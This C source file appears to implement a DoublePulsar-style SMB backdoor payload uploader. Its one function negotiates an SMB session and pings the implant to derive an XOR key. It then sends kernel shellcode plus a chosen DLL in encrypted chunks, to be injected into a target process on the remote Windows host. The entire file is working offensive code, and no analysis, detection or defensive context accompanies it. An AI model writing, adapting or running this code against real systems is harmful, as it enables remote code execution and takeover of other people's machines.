#define _WIN32_WINNT 0x0601
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <stddef.h>
#include <stdint.h>
#include <stdbool.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <ctype.h>
#include <errno.h>
#include <time.h>
#include <signal.h>
#include <stdarg.h>
#include <limits.h>
#include <math.h>
#include <io.h>
#include <fcntl.h>
#include <sys/types.h>
#include <sys/stat.h>
#include "config.h"
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <stdint.h>
#include <stddef.h>
#include <stdlib.h>
#include <string.h>
#include <limits.h>

extern void xor_buffer(uint8_t *buffer, size_t length, uint32_t key);

static int upload_send_all(SOCKET sock, const uint8_t *buffer, size_t length)
{
    size_t sent = 0;

    while (sent < length) {
        int amount = length - sent > INT_MAX ? INT_MAX : (int)(length - sent);
        int result = send(sock, (const char *)buffer + sent, amount, 0);
        if (result == SOCKET_ERROR || result == 0)
            return -1;
        sent += (size_t)result;
    }
    return 0;
}

static int upload_recv_all(SOCKET sock, uint8_t *buffer, size_t length)
{
    size_t received = 0;

    while (received < length) {
        int amount = length - received > INT_MAX ? INT_MAX : (int)(length - received);
        int result = recv(sock, (char *)buffer + received, amount, 0);
        if (result == SOCKET_ERROR || result == 0)
            return -1;
        received += (size_t)result;
    }
    return 0;
}

static int upload_receive_packet(SOCKET sock, uint8_t **packet, size_t *packet_length)
{
    uint8_t header[4];
    uint32_t body_length;
    uint8_t *result;

    *packet = NULL;
    *packet_length = 0;

    if (upload_recv_all(sock, header, sizeof(header)) != 0)
        return -1;

    body_length = ((uint32_t)header[1] << 16) |
                  ((uint32_t)header[2] << 8) |
                  (uint32_t)header[3];
    result = (uint8_t *)malloc((size_t)body_length + sizeof(header));
    if (result == NULL)
        return -1;

    memcpy(result, header, sizeof(header));
    if (body_length != 0 &&
        upload_recv_all(sock, result + sizeof(header), body_length) != 0) {
        free(result);
        return -1;
    }

    *packet = result;
    *packet_length = (size_t)body_length + sizeof(header);
    return 0;
}

static void upload_store_le16(uint8_t *destination, uint16_t value)
{
    destination[0] = (uint8_t)value;
    destination[1] = (uint8_t)(value >> 8);
}

static void upload_store_le32(uint8_t *destination, uint32_t value)
{
    destination[0] = (uint8_t)value;
    destination[1] = (uint8_t)(value >> 8);
    destination[2] = (uint8_t)(value >> 16);
    destination[3] = (uint8_t)(value >> 24);
}

int upload_payload(const char *ip, int port, const char *payload_path, int payload_type)
{
    WSADATA wsa_data;
    SOCKET sock = INVALID_SOCKET;
    HANDLE file = INVALID_HANDLE_VALUE;
    uint8_t *dll = NULL;
    uint8_t *payload = NULL;
    uint8_t *response = NULL;
    size_t response_length = 0;
    uint32_t dll_size;
    uint32_t payload_size;
    uint32_t user_id;
    uint32_t tree_id;
    uint32_t key;
    uint32_t sig;
    uint32_t inject_hash = 0;
    size_t process_length;
    size_t i;
    LARGE_INTEGER file_size;
    DWORD bytes_read;
    size_t dll_read;
    int wsa_started = 0;
    int result = -1;
    struct sockaddr_in address;

    (void)payload_type;

    if (ip == NULL || payload_path == NULL || port < 1 || port > 65535)
        return -1;
    if (WSAStartup(MAKEWORD(2, 2), &wsa_data) != 0)
        return -1;
    wsa_started = 1;

    file = CreateFileA(payload_path, GENERIC_READ, FILE_SHARE_READ, NULL,
                       OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (file == INVALID_HANDLE_VALUE || !GetFileSizeEx(file, &file_size) ||
        file_size.QuadPart < 0 ||
        (uint64_t)file_size.QuadPart > UINT32_MAX ||
        (uint64_t)file_size.QuadPart + (uint64_t)KERNEL_RUNDLL_SIZE > UINT32_MAX)
        goto cleanup;

    dll_size = (uint32_t)file_size.QuadPart;
    payload_size = (uint32_t)(dll_size + (uint32_t)KERNEL_RUNDLL_SIZE);

    if (dll_size != 0) {
        dll = (uint8_t *)malloc(dll_size);
        if (dll == NULL)
            goto cleanup;

        dll_read = 0;
        while (dll_read < dll_size) {
            DWORD request = (dll_size - dll_read > MAXDWORD)
                                ? MAXDWORD
                                : (DWORD)(dll_size - dll_read);
            if (!ReadFile(file, dll + dll_read, request, &bytes_read, NULL) ||
                bytes_read == 0)
                goto cleanup;
            dll_read += bytes_read;
        }
    }

    if (!CloseHandle(file)) {
        file = INVALID_HANDLE_VALUE;
        goto cleanup;
    }
    file = INVALID_HANDLE_VALUE;

    payload = (uint8_t *)malloc(payload_size == 0 ? 1 : payload_size);
    if (payload == NULL)
        goto cleanup;

    memcpy(payload, KERNEL_RUNDLL_SHELLCODE, KERNEL_RUNDLL_SIZE);
    if (dll_size != 0)
        memcpy(payload + KERNEL_RUNDLL_SIZE, dll, dll_size);

    if ((size_t)KERNEL_RUNDLL_TOTAL_OFFSET + 4 > KERNEL_RUNDLL_SIZE ||
        (size_t)KERNEL_RUNDLL_DLLSIZE_OFFSET + 4 > KERNEL_RUNDLL_SIZE ||
        (size_t)KERNEL_RUNDLL_ORDINAL_OFFSET + 4 > KERNEL_RUNDLL_SIZE ||
        (size_t)KERNEL_RUNDLL_HASH_OFFSET + 4 > KERNEL_RUNDLL_SIZE ||
        dll_size > UINT32_MAX - 3978U)
        goto cleanup;

    upload_store_le32(payload + KERNEL_RUNDLL_TOTAL_OFFSET, dll_size + 3978U);
    upload_store_le32(payload + KERNEL_RUNDLL_DLLSIZE_OFFSET, dll_size);
    upload_store_le32(payload + KERNEL_RUNDLL_ORDINAL_OFFSET, 1U);

    process_length = strlen(TARGET_INJECT_PROCESS);
    for (i = 0; i < process_length; ++i)
        inject_hash = inject_hash * 127U + (uint8_t)TARGET_INJECT_PROCESS[i];
    upload_store_le32(payload + KERNEL_RUNDLL_HASH_OFFSET, inject_hash);

    memset(&address, 0, sizeof(address));
    address.sin_family = AF_INET;
    address.sin_port = htons((u_short)port);
    if (InetPtonA(AF_INET, ip, &address.sin_addr) != 1)
        goto cleanup;

    sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (sock == INVALID_SOCKET ||
        connect(sock, (const struct sockaddr *)&address, sizeof(address)) == SOCKET_ERROR)
        goto cleanup;

    if (upload_send_all(sock, SMB_NEGOTIATE_PKT, sizeof(SMB_NEGOTIATE_PKT) - 1) != 0 ||
        upload_receive_packet(sock, &response, &response_length) != 0)
        goto cleanup;
    free(response);
    response = NULL;

    if (upload_send_all(sock, SMB_SESSION_SETUP_PKT,
                        sizeof(SMB_SESSION_SETUP_PKT) - 1) != 0 ||
        upload_receive_packet(sock, &response, &response_length) != 0)
        goto cleanup;
    if (response_length < 34)
        goto cleanup;
    user_id = (uint32_t)response[32] | ((uint32_t)response[33] << 8);
    free(response);
    response = NULL;

    {
        uint8_t tree_packet[sizeof(SMB_TREE_CONNECT_PKT)];
        memcpy(tree_packet, SMB_TREE_CONNECT_PKT, sizeof(tree_packet));
        if (sizeof(tree_packet) < 34)
            goto cleanup;
        upload_store_le16(tree_packet + 32, (uint16_t)user_id);
        if (upload_send_all(sock, tree_packet, sizeof(SMB_TREE_CONNECT_PKT) - 1) != 0 ||
            upload_receive_packet(sock, &response, &response_length) != 0)
            goto cleanup;
    }

    if (response_length < 30)
        goto cleanup;
    tree_id = (uint32_t)response[28] | ((uint32_t)response[29] << 8);
    free(response);
    response = NULL;

    {
        uint8_t ping_packet[sizeof(DP_PING_PKT)];
        memcpy(ping_packet, DP_PING_PKT, sizeof(ping_packet));
        if (sizeof(ping_packet) < 34 ||
            (size_t)SMB_RESP_SIGNATURE_START + 4 > UINT32_MAX)
            goto cleanup;
        upload_store_le16(ping_packet + 28, (uint16_t)tree_id);
        upload_store_le16(ping_packet + 32, (uint16_t)user_id);
        if (upload_send_all(sock, ping_packet, sizeof(DP_PING_PKT) - 1) != 0 ||
            upload_receive_packet(sock, &response, &response_length) != 0)
            goto cleanup;
    }

    if ((size_t)SMB_RESP_SIGNATURE_START + 4 > response_length)
        goto cleanup;
    sig = (uint32_t)response[SMB_RESP_SIGNATURE_START] |
          ((uint32_t)response[SMB_RESP_SIGNATURE_START + 1] << 8) |
          ((uint32_t)response[SMB_RESP_SIGNATURE_START + 2] << 16) |
          ((uint32_t)response[SMB_RESP_SIGNATURE_START + 3] << 24);
    key = (2U * sig) ^
          ((((sig >> 16) | (sig & 0x00FF0000U)) >> 8) |
           (((sig << 16) | (sig & 0x0000FF00U)) << 8));
    free(response);
    response = NULL;

    xor_buffer(payload, payload_size, key);

    for (i = 0; i < payload_size; ) {
        size_t chunk_size = payload_size - i;
        size_t packet_length;
        uint8_t *packet;
        uint8_t parameters[12];

        if (chunk_size > SMB_EXEC_SHELLCODE_LEN)
            chunk_size = SMB_EXEC_SHELLCODE_LEN;
        if (SMB_EXEC_TEMPLATE_LEN != 70 ||
            chunk_size > UINT32_MAX ||
            chunk_size + SMB_EXEC_TEMPLATE_LEN + sizeof(parameters) - 4 > 0xFFFFFFU)
            goto cleanup;

        packet_length = SMB_EXEC_TEMPLATE_LEN + sizeof(parameters) + chunk_size;
        packet = (uint8_t *)malloc(packet_length);
        if (packet == NULL)
            goto cleanup;

        memcpy(packet, DP_EXEC_PKT, SMB_EXEC_TEMPLATE_LEN);
        upload_store_le32(parameters, payload_size);
        upload_store_le32(parameters + 4, (uint32_t)chunk_size);
        upload_store_le32(parameters + 8, (uint32_t)i);
        xor_buffer(parameters, sizeof(parameters), key);
        memcpy(packet + SMB_EXEC_TEMPLATE_LEN, parameters, sizeof(parameters));
        memcpy(packet + SMB_EXEC_TEMPLATE_LEN + sizeof(parameters),
               payload + i, chunk_size);

        if ((size_t)SMB_NETBIOS_LEN_OFFSET + 3 > packet_length ||
            (size_t)SMB_EXEC_TOTAL_DATA_OFFSET + 2 > packet_length ||
            (size_t)SMB_EXEC_DATA_COUNT_OFFSET + 2 > packet_length ||
            (size_t)SMB_EXEC_BYTE_COUNT_OFFSET + 2 > packet_length ||
            (size_t)SMB_TID_OFFSET + 2 > packet_length ||
            (size_t)SMB_UID_OFFSET + 2 > packet_length) {
            free(packet);
            goto cleanup;
        }

        {
            uint32_t netbios_length = (uint32_t)(chunk_size +
                                      SMB_EXEC_TEMPLATE_LEN +
                                      sizeof(parameters) - 4);
            packet[SMB_NETBIOS_LEN_OFFSET] = (uint8_t)(netbios_length >> 16);
            packet[SMB_NETBIOS_LEN_OFFSET + 1] = (uint8_t)(netbios_length >> 8);
            packet[SMB_NETBIOS_LEN_OFFSET + 2] = (uint8_t)netbios_length;
        }
        upload_store_le16(packet + SMB_EXEC_TOTAL_DATA_OFFSET, (uint16_t)chunk_size);
        upload_store_le16(packet + SMB_EXEC_DATA_COUNT_OFFSET, (uint16_t)chunk_size);
        upload_store_le16(packet + SMB_EXEC_BYTE_COUNT_OFFSET,
                          (uint16_t)(chunk_size + sizeof(parameters)));
        upload_store_le16(packet + SMB_TID_OFFSET, (uint16_t)tree_id);
        upload_store_le16(packet + SMB_UID_OFFSET, (uint16_t)user_id);

        if (upload_send_all(sock, packet, packet_length) != 0) {
            free(packet);
            goto cleanup;
        }
        free(packet);

        if (upload_receive_packet(sock, &response, &response_length) != 0)
            goto cleanup;

        i += chunk_size;
    }

    if (response == NULL || response_length <= DP_RESP_MUX_ID_OFFSET ||
        response[DP_RESP_MUX_ID_OFFSET] != DP_MULTIPLEX_ID_EXEC)
        goto cleanup;

    result = 0;

cleanup:
    if (response != NULL)
        free(response);
    if (payload != NULL)
        free(payload);
    if (dll != NULL)
        free(dll);
    if (file != INVALID_HANDLE_VALUE)
        CloseHandle(file);
    if (sock != INVALID_SOCKET)
        closesocket(sock);
    if (wsa_started)
        WSACleanup();
    return result;
}